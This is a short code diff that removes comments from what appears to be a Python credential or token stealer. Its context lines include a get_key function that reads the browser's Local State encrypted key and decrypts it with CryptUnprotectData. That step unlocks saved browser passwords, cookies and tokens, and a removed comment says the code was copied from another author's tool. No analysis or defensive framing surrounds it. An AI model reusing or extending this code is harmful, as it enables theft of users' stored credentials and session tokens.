@@ -25,13 +25,11 @@ def tokens():
 
 def is_base64(s):
     try:
-        # Check if the string is a valid Base64-encoded string
         return base64.b64encode(base64.b64decode(s)) == s.encode()
     except Exception:
         return False
 
 def add_padding(s):
-    # Add padding to the Base64 string if necessary
     while len(s) % 4 != 0:
         s += "="
     return s
@@ -61,7 +59,6 @@ def get_key(path):
     master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
     master_key = master_key[5:]
     master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
-    # ngl I stole all this from addidix cause im too lazy to remake it since my shit broken af
     return master_key
 
 
